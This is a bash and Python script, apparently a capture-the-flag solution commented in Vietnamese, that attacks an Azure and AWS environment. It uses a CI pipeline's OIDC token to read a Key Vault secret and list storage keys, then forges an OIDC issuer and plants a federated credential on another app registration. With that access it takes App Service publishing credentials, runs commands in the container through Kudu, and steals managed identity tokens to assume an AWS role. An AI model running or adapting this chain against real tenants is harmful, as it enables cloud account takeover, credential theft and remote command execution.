#!/usr/bin/env bash
# v19 — có publishingcredentials của app-tbl-reporting-prod qua tbl-reporting-service.
#   Kudu /api/command: xin token MI id-tbl-reporting-writer, đọc FIC của MI (issuer/subject/audience
#   cho AWS), rồi AssumeRoleWithWebIdentity -> S3 -> flag. Tự dọn FIC/blob.
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG_SEA=rg-tbl-platform-prod-sea; RG_EUS=rg-tbl-reporting-prod-eus
SITE=app-tbl-reporting-prod; MI=id-tbl-reporting-writer
SA=sttblcilogsprodx3euoz; PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
RSVC=12ed54de-f2eb-4784-804c-3a7a3e83a9e9      # tbl-reporting-service (có publishingcredentials)
HOST="https://$SA.z23.web.core.windows.net"
PFX="hx-$RANDOM$RANDOM"; SUBJECT="tbl-verify-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_SEA/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
RSVC_OID=$(curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$filter=appId eq '$RSVC'&\$select=id" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'][0]['id'])")
echo "[*] prefix=$PFX graph=${#G} key=${#KEY0} rsvc_oid=$RSVC_OID"

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$RG_EUS" "$SITE" "$MI" "$G" "$RSVC" "$RSVC_OID" <<'PY'
import sys,json,time,uuid,base64,re,urllib.request,urllib.parse
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt
sa,key0,host,pfx,subject,ten,sub,rg,site,mi,graph,rsvc,rsvc_oid = sys.argv[1:14]
ISS=f"{host}/{pfx}"; B="https://management.azure.com"
FLAG=re.compile(r'DF26\{[^}]*\}')
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
web=svc.get_container_client("$web")
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
 "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)

def api(url,method="GET",tok=graph,body=None,raw=False,extra=None):
    h={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}
    if extra: h.update(extra)
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=60) as f:
            t=f.read(); return t.decode(errors="replace") if raw else (json.loads(t) if t else {})
    except Exception as e:
        try: b=e.read().decode(errors="replace")
        except Exception: b=str(e)
        return ("ERR "+b[:200]) if raw else {"error":b[:200]}
def mint():
    n=int(time.time())
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
      "nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception: return ""

# FIC trên tbl-reporting-service -> đăng nhập -> publishingcredentials
r=api(f"https://graph.microsoft.com/v1.0/applications/{rsvc_oid}/federatedIdentityCredentials","POST",
      body={"name":"ver-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
FID=r.get("id") if "error" not in r else None
print("[*] FIC:",("ok" if FID else r))

def cleanup():
    if FID: api(f"https://graph.microsoft.com/v1.0/applications/{rsvc_oid}/federatedIdentityCredentials/{FID}","DELETE")
    for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
        try: web.delete_blob(p)
        except Exception: pass

am=""
for i in range(10):
    time.sleep(15)
    am=exchange(rsvc,B+"/.default")
    if am: print("[*] exchange OK vòng",i+1); break
    print("   chờ FIC propagate... vòng",i+1)
if not am:
    print("[!] không đổi được token sau 150s"); cleanup(); raise SystemExit
SITEBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{site}"
MIBASE=f"{B}/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{mi}"

# ID resource của MI (cần cho Kudu khi xin token user-assigned)
mid=api(MIBASE+"?api-version=2023-01-31",tok=am)
MI_RESID=mid.get("id","") if isinstance(mid,dict) else ""
MI_CLIENTID=(mid.get("properties") or {}).get("clientId","") if isinstance(mid,dict) else ""
print("[*] MI resid:",MI_RESID,"clientId:",MI_CLIENTID)
fx=api(MIBASE+"/federatedIdentityCredentials?api-version=2023-01-31",tok=am)
AWS_FIC=[]
if isinstance(fx,dict):
    for c in fx.get("value",[]):
        p=c.get("properties",c)
        print("[*] MI-FIC:",c.get("name"),"iss=",p.get("issuer"),"sub=",p.get("subject"),"aud=",p.get("audiences"))
        AWS_FIC.append(p)

pc=api(SITEBASE+"/config/publishingcredentials/list?api-version=2022-03-01","POST",tok=am,body={})
if "error" in pc: print("[!] publishingcredentials:",pc);
else:
    p=pc.get("properties",pc)
    user,pw=p.get("publishingUserName"),p.get("publishingPassword")
    scm=p.get("scmUri","")
    print("[*] Kudu user:",user)
    auth=base64.b64encode(f"{user}:{pw}".encode()).decode()

    def kudu(path,method="GET",body=None):
        h={"Authorization":"Basic "+auth,"Content-Type":"application/json"}
        d=json.dumps(body).encode() if body is not None else None
        r=urllib.request.Request(f"https://{site}.scm.azurewebsites.net{path}",d,h,method=method)
        try:
            with urllib.request.urlopen(r,timeout=90) as f: return f.read().decode(errors="replace")
        except Exception as e:
            try: return "ERR "+e.read().decode(errors="replace")[:300]
            except Exception: return "ERR "+str(e)[:150]

    # /api/command chạy lệnh trong container
    def run(cmd):
        out=kudu("/api/command","POST",{"command":cmd,"dir":"/home"})
        try: return json.loads(out).get("Output","")+json.loads(out).get("Error","")
        except Exception: return out

    q=lambda s: urllib.parse.quote(s, safe="")
    print("=== env trong app ==="); print(run("printenv | grep -iE 'IDENTITY|MSI|AWS|ARN|ROLE' | sort")[:1200])
    rolearn=run("printenv AWS_ROLE_ARN").strip()
    print("   AWS_ROLE_ARN env =", rolearn[:160])

    # xin token MI cho các audience AWS khả dĩ (lấy đúng từ MI-FIC nếu có)
    auds=set(["api://AWS","sts.amazonaws.com"])
    for p in AWS_FIC:
        for a in (p.get("audiences") or []): auds.add(a)
    for aud in auds:
        print("=== MI token (resource="+aud+") ===")
        c=('curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource='
           + q(aud) + '&api-version=2019-08-01&mi_res_id=' + q(MI_RESID) + '"')
        o=run(c); print(o[:500])
        m=re.search(r'"access_token":"([^"]+)"', o)
        if not m: continue
        tok=m.group(1)
        if rolearn.startswith("arn:aws:iam::"):
            print("=== AWS AssumeRoleWithWebIdentity (aud="+aud+") ===")
            url=('https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn='
                 + q(rolearn) + '&RoleSessionName=s&WebIdentityToken=' + q(tok))
            aws=run('curl -s -H "Accept: application/json" "' + url + '"')
            print(aws[:900])
            if FLAG.findall(aws): print("*** FLAG", FLAG.findall(aws))

    print("=== grep flag trong wwwroot ===")
    print(run("grep -rIoE 'DF26[{][^}]*[}]' /home/site/wwwroot /home 2>/dev/null | head")[:400])

cleanup()
PY
echo "================ DONE ================"
